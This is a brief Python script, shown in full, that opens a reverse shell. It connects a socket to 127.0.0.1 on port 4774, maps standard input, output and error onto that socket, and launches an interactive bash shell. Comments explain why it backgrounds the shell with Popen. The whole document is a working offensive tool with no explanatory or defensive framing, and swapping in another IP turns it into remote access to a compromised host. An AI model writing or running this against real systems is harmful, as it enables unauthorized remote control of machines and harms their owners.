#!/usr/bin/env python
import socket,subprocess,os
ip='127.0.0.1'
port=4774
#fork works but closes TTY
#os.fork()
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((ip,port))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
#Use Popen so that it backgrounds No PS1 this way.
subprocess.Popen(["/bin/bash", "-i"], shell=True)
